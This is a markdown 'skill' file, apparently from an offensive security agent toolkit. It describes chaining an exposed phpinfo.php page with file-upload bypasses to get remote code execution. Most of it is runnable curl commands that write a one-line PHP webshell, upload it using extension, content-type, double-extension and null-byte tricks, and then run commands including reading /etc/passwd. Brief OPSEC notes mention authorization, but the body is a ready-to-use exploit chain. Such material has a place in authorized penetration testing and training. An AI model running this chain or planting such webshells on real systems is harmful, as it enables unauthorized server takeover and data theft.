---
name: phpinfo-upload-rce
description: Chain PHPInfo disclosure + upload bypass → RCE via webshell
version: 1.0.0
phase: chains
category: chaining
tags: [phpinfo, upload, rce, file-upload, webshell]
tools: [curl]
difficulty: intermediate
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - file-upload-bypass
  - webshell-deploy
mitre_attack:
  - T1190
  - T1505.003
---

## When to Use

Use this skill when phpinfo.php is accessible on the target, revealing upload
paths, PHP configuration, and disabled functions. Chain this with file upload
bypass to deploy a webshell for RCE.

## Prerequisites

- curl
- phpinfo.php accessible on target
- File upload functionality available

## Procedure

```bash
# STEP 1: Discover phpinfo.php
curl -sk "https://TARGET/phpinfo.php" | grep -i "upload_tmp_dir\|file_uploads\|upload_max"

# STEP 2: Extract upload configuration
curl -sk "https://TARGET/phpinfo.php" | grep -E "upload_tmp_dir|file_uploads|upload_max_filesize|post_max_size|disable_functions"

# STEP 3: Find upload endpoint
curl -sk "https://TARGET/" | grep -oiE 'action="[^"]*upload[^"]*"'
curl -sk "https://TARGET/upload.php" -D- 2>/dev/null | head -20

# STEP 4: Test file upload with benign file
curl -sk -X POST "https://TARGET/upload.php" \
  -F "file=@/etc/hostname;filename=test.txt"

# STEP 5: Bypass upload restriction — rename PHP to .jpg
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cp /tmp/shell.php /tmp/shell.jpg
curl -sk -X POST "https://TARGET/upload.php" \
  -F "file=@/tmp/shell.jpg;filename=shell.php.jpg"

# STEP 6: Bypass content-type check
curl -sk -X POST "https://TARGET/upload.php" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@/tmp/shell.php;filename=shell.php;type=image/jpeg"

# STEP 7: Bypass double extension (.php.jpg)
curl -sk -X POST "https://TARGET/upload.php" \
  -F "file=@/tmp/shell.php;filename=shell.php.jpg"

# STEP 8: Test null byte bypass (older PHP)
curl -sk -X POST "https://TARGET/upload.php" \
  -F "file=@/tmp/shell.php;filename=shell.php%00.jpg"

# STEP 9: Verify upload and execute
curl -sk "https://TARGET/uploads/shell.php?cmd=id"
curl -sk "https://TARGET/uploads/shell.php?cmd=cat+/etc/passwd"
```

## OPSEC Rules

- **CRITICAL**: phpinfo reveals server configuration — do not exploit beyond assessment
- Document disabled functions (affects webshell capability)
- Clean up all uploaded test files
- Do not upload real webshells without authorization
- Log all upload attempts for remediation report

## Verification

- Confirm phpinfo.php is accessible and reveals upload config
- Verify file upload endpoint accepts files
- Test upload bypass techniques
- Confirm webshell executes after upload

## Pitfalls

- WAF may block phpinfo.php access
- File upload may require authentication
- Upload directory may not be web-accessible
- PHP may disable system() function (phpinfo reveals this)
- Content-Type validation may block PHP files
- Some upload handlers use magic bytes checking

## Output Format

```
[CHAIN] PHPInfo → Upload → RCE chain successful
  Step 1: phpinfo.php accessible (reveals upload config)
  Step 2: Upload endpoint found: /upload.php
  Step 3: Bypass: double extension (.php.jpg)
  Step 4: Webshell uploaded and executed
  Step 5: RCE confirmed (www-data)
  Disabled functions: none
  Severity: CRITICAL (9.5)
```
